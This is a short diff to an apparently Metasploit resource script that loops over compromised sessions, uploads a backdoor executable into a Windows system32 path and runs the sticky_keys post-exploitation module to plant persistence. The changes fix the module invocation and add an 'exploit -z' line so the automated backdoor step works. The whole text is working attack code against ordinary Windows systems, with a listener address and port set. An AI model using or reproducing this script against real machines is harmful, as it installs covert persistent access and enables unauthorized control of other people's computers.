@@ -12,7 +12,7 @@ lhost = "192.168.1.33"
 lport = "443"
 
 ### Used for stickykeys persistence ###
-targetfile = "c:\\windows\\system32\\com\\comrepl.exe"
+targetfile = "c:\\\\windows\\\\system32\\\\com\\\\comrepm.exe"
 backdoor = "/root/backdoor.exe"
 
 
@@ -61,13 +61,13 @@ framework.sessions.each do |num,session|
 
 	### Upload a file to use for Sticky Keys ###
 
-	## not working ##
 	session.fs.file.upload_file("#{targetfile}","#{backdoor}")
 
 	### Sticky Keys ###
-	run_single("post/windows/manage/sticky_keys")
+	run_single("use post/windows/manage/sticky_keys")
 	run_single("set EXE #{targetfile}")
 	run_single("set SESSION #{num}")
+	run_single("exploit -z")
 end
 
 </ruby>
